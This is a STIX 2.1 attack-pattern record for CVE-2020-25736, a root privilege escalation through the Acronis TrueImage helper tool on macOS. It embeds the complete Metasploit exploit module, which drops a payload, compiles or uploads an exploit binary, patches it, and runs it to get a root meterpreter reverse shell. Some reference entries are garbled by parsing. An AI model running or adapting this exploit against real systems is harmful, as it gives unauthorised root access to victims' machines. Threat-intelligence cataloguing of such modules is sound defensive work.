{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8bf80b85-2d8a-4d73-8a46-acaf19ddd89f",
    "created": "2024-08-14T16:34:45.753565Z",
    "modified": "2024-08-14T16:34:45.753568Z",
    "name": "Acronis TrueImage XPC Privilege Escalation",
    "description": " Acronis TrueImage versions 2019 update 1 through 2021 update 1 are vulnerable to privilege escalation. The `com.acronis.trueimagehelper` helper tool does not perform any validation on connecting clients which gives arbitrary clients the ability to execute functions provided by the helper tool with `root` privileges.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/acronis_trueimage_xpc_privesc.rb",
            "external_id": "acronis_trueimage_xpc_privesc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-25736"
        },
        {
            "source_name": "reference",
            "url": "https://kb.acronis.com/content/68061"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/a1Yrvagxt5/cve-2020-25736"
        },
        {
            "source_name": "file_contents=exploit_data(CVE-2020-25736",
            "external_id": "acronis-exp.erb)"
        },
        {
            "source_name": "compiled=exploit_data(CVE-2020-25736",
            "external_id": "acronis-exp.macho)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Common\n  include Msf::Post::Process\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Acronis TrueImage XPC Privilege Escalation',\n        'Description' => %q{\n          Acronis TrueImage versions 2019 update 1 through 2021 update 1\n          are vulnerable to privilege escalation. The `com.acronis.trueimagehelper`\n          helper tool does not perform any validation on connecting clients,\n          which gives arbitrary clients the ability to execute functions provided\n          by the helper tool with `root` privileges.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Csaba Fitzl', # @theevilbit - Vulnerability Discovery\n          'Shelby Pace' # Metasploit Module and Objective-c code\n        ],\n        'Platform' => [ 'osx' ],\n        'Arch' => [ ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'Privileged' => true,\n        'References' => [\n          [ 'CVE', '2020-25736' ],\n          [ 'URL', 'https://kb.acronis.com/content/68061' ],\n          [ 'URL', 'https://attackerkb.com/topics/a1Yrvagxt5/cve-2020-25736' ]\n        ],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'osx/x64/meterpreter/reverse_tcp',\n          'WfsDelay' => 15\n        },\n        'DisclosureDate' => '2020-11-11',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('WRITABLE_DIR', [ true, 'Writable directory to write the payload to', '/tmp' ]),\n      OptString.new('SHELL', [ true, 'Shell to use for executing payload', '/bin/zsh' ]),\n      OptEnum.new('COMPILE', [ true, 'Compile exploit on target', 'Auto', [ 'Auto', 'True', 'False' ] ])\n    ])\n  end\n\n  def tmp_dir\n    datastore['WRITABLE_DIR'].to_s\n  end\n\n  def sys_shell\n    datastore['SHELL'].to_s\n  end\n\n  def compile\n    datastore['COMPILE']\n  end\n\n  def compile_on_target?\n    return false if compile == 'False'\n\n    if compile == 'Auto'\n      ret = cmd_exec('xcode-select -p')\n      return false if ret.include?('error: unable')\n    end\n\n    true\n  end\n\n  def exp_file_name\n    @exp_file_name ||= Rex::Text.rand_text_alpha(5..10)\n  end\n\n  def check\n    helper_location = '/Library/PrivilegedHelperTools'\n    helper_svc_names = [ 'com.acronis.trueimagehelper', 'com.acronis.helpertool' ]\n    plist = '/Applications/Acronis True Image.app/Contents/Info.plist'\n\n    unless helper_svc_names.any? { |svc_name| file?(\"#{helper_location}/#{svc_name}\") }\n      return CheckCode::Safe\n    end\n\n    return CheckCode::Detected('Service found, but cannot determine version via plist') unless file?(plist)\n\n    plutil_cmd = \"plutil -extract CFBundleVersion raw \\'#{plist}\\'\"\n    build_no = cmd_exec(plutil_cmd)\n    return CheckCode::Detected('Could not retrieve build number from plist') if build_no.blank?\n\n    build_no = build_no.to_i\n    vprint_status(\"Found build #{build_no}\")\n    return CheckCode::Appears('Vulnerable build found') if build_no > 14170 && build_no < 33610\n\n    CheckCode::Safe('Acronis version found is not vulnerable')\n  end\n\n  def exploit\n    payload_name = Rex::Text.rand_text_alpha(7)\n    @payload_path = \"#{tmp_dir}/#{payload_name}\"\n\n    print_status(\"Attempting to write payload at #{@payload_path}\")\n    unless upload_and_chmodx(@payload_path, generate_payload_exe)\n      fail_with(Failure::BadConfig, 'Failed to write payload. Consider changing WRITABLE_DIR option.')\n    end\n    vprint_good(\"Successfully wrote payload at #{@payload_path}\")\n\n    @pid = get_valid_pid\n    exp_bin_path = \"#{tmp_dir}/#{exp_file_name}\"\n\n    if compile_on_target?\n      exp_src = \"#{exp_file_name}.m\"\n      exp_path = \"#{tmp_dir}/#{exp_src}\"\n      compile_cmd = \"gcc -framework Foundation #{exp_path} -o #{exp_bin_path}\"\n\n      unless write_file(exp_path, objective_c_code)\n        fail_with(Failure::BadConfig, 'Failed to write Objective-C exploit to disk. WRITABLE_DIR may need to be changed')\n      end\n      register_files_for_cleanup(@payload_path, exp_path, exp_bin_path)\n\n      ret = cmd_exec(compile_cmd)\n      fail_with(Failure::UnexpectedReply, \"Failed to compile #{exp_src}\") unless ret.blank?\n\n      print_status(\"Successfully compiled #{exp_src}...Now executing payload\")\n    else\n      print_status(\"Using pre-compiled exploit #{exp_bin_path}\")\n      compiled_exploit = compiled_exp\n      unless upload_and_chmodx(exp_bin_path, compiled_exploit)\n        fail_with(Failure::BadConfig, 'Failed to write compiled exploit. Consider changing WRITABLE_DIR option.')\n      end\n\n      register_files_for_cleanup(exp_bin_path, @payload_path)\n    end\n\n    cmd_exec(exp_bin_path)\n  end\n\n  def objective_c_code\n    file_contents = exploit_data('CVE-2020-25736', 'acronis-exp.erb')\n    ERB.new(file_contents).result(binding)\n  rescue Errno::ENOENT\n    fail_with(Failure::NotFound, 'ERB payload file not found')\n  end\n\n  def compiled_exp\n    compiled = exploit_data('CVE-2020-25736', 'acronis-exp.macho')\n    compiled.gsub!('/tmp/payload', @payload_path)\n    compiled.gsub!('/bin/zsh', sys_shell)\n    compiled.gsub!(\"\\xEF\\xBE\\xAD\\xDE\".force_encoding('ASCII-8BIT'), [@pid.to_i].pack('V'))\n\n    compiled\n  end\n\n  def get_valid_pid\n    procs = get_processes\n    return '1' if procs.empty?\n\n    len = procs.length\n    rand_proc = procs[rand(1...len)]\n    return '1' if rand_proc['pid'].to_s.blank?\n\n    rand_proc['pid'].to_s\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-11-11",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}